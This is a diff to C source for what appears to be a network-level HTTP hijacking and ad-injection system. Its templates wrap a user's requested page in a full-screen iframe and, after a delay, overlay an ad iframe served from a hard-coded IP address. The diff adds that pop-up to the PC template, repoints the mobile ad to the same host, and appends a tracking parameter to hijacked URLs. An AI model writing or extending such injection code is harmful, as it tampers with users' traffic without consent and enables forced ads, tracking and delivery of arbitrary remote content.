@@ -252,10 +252,10 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
 {
     {
         .name = "pc.html",
-        .head = 
+        .head =
             "<!DOCTYPE HTML>\n"
             "<html>\n"
-            "<head>\n"
+            " <head>\n"
             "<meta charset=\"utf-8\">\n"
             "<title></title>\n"
             "<script>\n"
@@ -266,19 +266,33 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "www.taobao.com",
         .tail =
             "\";\n"
-            "d.getElementById(\"m\").src=f;\n"
+            "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_tTI=tTI\';\n"
             "}\n"
+            "\n"
+            "setTimeout(function(){d.getElementById(\"x\").style.display=\'block\';}, 2000);\n"
+            "\n"
+            "function c(){\n"
+            "x.style.display=\"none\"\n"
+            "}\n"
+            "\n"
             "</script>\n"
             "<style>\n"
             "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
             "a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}\n"
+            "#x{position:absolute;z-index:2;right:18px;bottom:0px;width:300px;height:250px}\n"
             "#i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
+            ".close{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}\n"
             "</style>\n"
             "</head>\n"
             "<body onLoad=u()>\n"
             "<div id=i>\n"
-            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
+            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n"
             "</div>\n"
+            "<div id=x>\n"
+            "<iframe src=\"http://61.174.50.211:8001/locate_3/wpz_pc.html\" width=300 height=250 scrolling=no frameborder=0></iframe>\n"
+            "<a class=\"close\" onClick=c()>关闭</a>\n"
+            "</div>\n"
+            "\n"
             "</body>\n"
             "</html>\n"
             "\n",
@@ -319,7 +333,7 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "\n",
     },
 #endif
-#if 1
+#if 0
     {
         .name = "mobile.html",
         .head = 
@@ -370,14 +384,14 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "        <style>\n"
             "            body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
             "            a{cursor:pointer;display:block;position:relative;border:1px;border-radius:1em;background-color:#fff;color:#333; opacity:.8;z-index:3;right:2px;top:50%;margin-top:-20px;margin-left:95%;line-height:20px;text-align:center;width:20px;font-size:14px}\n"
-            "            #x{z-index:2;bottom:-1px;width:100%;height:80px;right:0px;}\n"
+            "            #x{position:absolute;z-index:2;bottom:0px;width:100%;height:80px;right:0px;}\n"
             "            #i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
             "        </style>\n"
             "    </head>\n"
             "    <body style=\'background-color:transparent; margin:0px; height:100%\'>\n"
             "        <div id=x>\n"
             "            <a onClick=\'x.style.display=\"none\"\'>X</a>\n"
-            "            <iframe src=\"http://219.234.83.60/ad/mobile.html\" width=100% height=60 scrolling=no frameborder=0 style=\'border:0px none;display:block\'></iframe>\n"
+            "            <iframe src=\"http://61.174.50.211:8001/locate_3/yousixing17juren04mb25sd.html\" width=100% height=80 scrolling=no frameborder=0 style=\'border:0px none;display:block\'></iframe>\n"
             "        </div>\n"
             "        <div id=i>\n"
             "            <iframe id=\'m\' name=\'m\' width=\'100%\' height=\'100%\' frameborder=\'0\'  ></iframe>\n"
@@ -406,7 +420,7 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
 #endif
 };
 
-uint8_t send_mode = ADT_SEND_SINGLE;
+uint8_t send_mode = ADT_SEND_MULTI;
 berr adt_get_send(uint8_t *send)
 {
     if ( NULL == send )
@@ -453,7 +467,8 @@ http_content_len_get(hytag_t *hytag)
 {
     uint16_t len = 0;
     len += http_body[hytag->template].head_len;//strlen(http_body[hytag->template].head);    
-    len += strlen(hytag->hijack_url);
+    //len += strlen(hytag->hijack_url);
+    len += hytag->url_len;
     len += http_body[hytag->template].tail_len;//strlen(http_body[hytag->template].tail);
     return len;
 }
@@ -714,7 +729,7 @@ berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
     if( adt_send_is_single())
     {
         len += snprintf(buf+len, 2048-len, "%s%s%s", 
-        http_body[hytag->template].head, hytag->hijack_url, http_body[hytag->template].tail);                
+        http_body[hytag->template].head, hytag->url, http_body[hytag->template].tail);                
     }
     hytag->l5_len = len;
     return E_SUCCESS;
